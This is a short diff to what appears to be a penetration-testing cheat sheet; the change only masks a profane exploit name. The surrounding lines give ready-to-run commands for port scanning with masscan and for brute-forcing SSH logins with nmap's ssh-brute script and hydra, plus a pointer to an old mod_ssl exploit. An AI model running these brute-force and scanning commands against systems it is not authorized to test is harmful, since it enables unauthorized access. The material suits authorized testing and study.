@@ -29,7 +29,7 @@ masscan -p0-65535 10.11.1.7 --rate 150000 -oL output.txt <br />
 
 ### Scanning per protocols
 - **SSH(22)** <br />
-OpenFuck (Apache mod_ssl < 2.8.7 OpenSSL) 764.c <br />
+OpenF*** (Apache mod_ssl < 2.8.7 OpenSSL) 764.c <br />
 Bruteforce : <br />
 nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 192.168.88.152
 hydra -l user -P /usr/share/wordlists/rockyou.txt  192.168.88.171 ssh -t 4
